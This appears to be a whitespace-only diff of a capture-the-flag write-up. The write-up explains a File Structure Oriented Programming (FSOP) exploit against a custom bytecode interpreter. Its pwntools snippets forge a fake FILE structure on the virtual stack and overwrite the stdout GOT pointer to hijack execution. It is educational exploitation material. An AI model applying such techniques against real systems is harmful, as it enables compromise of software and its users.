@@ -140,7 +140,7 @@ Since this program is an interpreter this is likely the "simulated stack" data a
 
 A very important part of this program is the instruction set defined by this **INST** enum giving us the following instructions : 
 ```
-    ADD = 0
+    	ADD = 0
 	SUB = 1
 	DIV = 2
 	MUL = 3
@@ -424,9 +424,9 @@ Great start :D. Now for the tricky part ! As I mentionned before we are able to 
 This technique of exploitation has been referenced with many names but the most common are **FSOP** *(File Structure Oriented Programming)* or **File Structure Exploitation** more generally. As in my other writeups, I won't go over the deep details of how and why this technique works (otherwise this writeup is gonna be long enough to get published as a novel) but I will try my best to make it not sound like absolute dark magic :)
 
 ```py
-	# ...
+    # ...
 
-	info("Crafting File Struct to overwrite stdout")
+    info("Crafting File Struct to overwrite stdout")
 
     wide_data = elf.sym.stack  # we'll store the stream on the fake stack
     stream = elf.sym.stack + 0xe8
@@ -444,8 +444,7 @@ This technique of exploitation has been referenced with many names but the most 
     }, filler=b'\x00')
 
     total_data = (wide_data_bytes + bytes(fp))[::-1] # we flip the data to insert on stack
-
-	# ...
+    # ...
 ```
 
 This is the file structure I came up with using pwntools embeded FileStructure utility to generate our own *_IO_file_plus* file struct. Since we have a lot of space available on the virtual stack I decided to not even bother making overlapping structs with the *_IO_wide_data* struct and just decided to place it before the actual file structure as we can see in the **wide_data** and **stream** variables defined before the construction of the file structure itself.  
@@ -461,15 +460,15 @@ If you are new to this concept and didn't understand anything said in these last
 Now that the complicated explanations are over, let's load all of this data on the virtual stack using the push instruction. Remember, **PUSH** takes 8 bytes at a time and we will have to insert our file stream's data backwards so that the stack lays all the bytes in the right order for libc to consider it a valid stream (and generally for our exploit to work).
 
 ```py
-	# ...
+    # ...
 
-	shellcode = ""
+    shellcode = ""
     for i in range(0, len(total_data), 8):
         block = total_data[i:i+8]
 		# pwntools already does packing for us so we don't want to swap endianness again, therefore we use big endian
         shellcode += "PUSH 0x%xq\n" % unpack(block, endianness="big")
 
-	# ...
+    # ...
 ```
 
 and finally we can add our **LEA** instruction to replace the **stdout** pointer to our own fake file structure and trigger our exploit by using **PRT**. (Note that you don't actually need to call **PRT** as the printf function is called after execution to prompt the user for more bytecode and that by itself will trigger our payload. I just prefer calling **PRT** as it is more explicit for our method).
@@ -477,9 +476,9 @@ and finally we can add our **LEA** instruction to replace the **stdout** pointer
 We can do this with the following code : 
 
 ```py
-	# ...
+    # ...
 
-	shellcode += "LEA 0x404020q, 0x%xq\n" % stream # overwrite stdout on got with our stack
+    shellcode += "LEA 0x404020q, 0x%xq\n" % stream # overwrite stdout on got with our stack
     shellcode += "PRT 0x41414141s"
 
     info("======== FINAL BYTECODE =========")
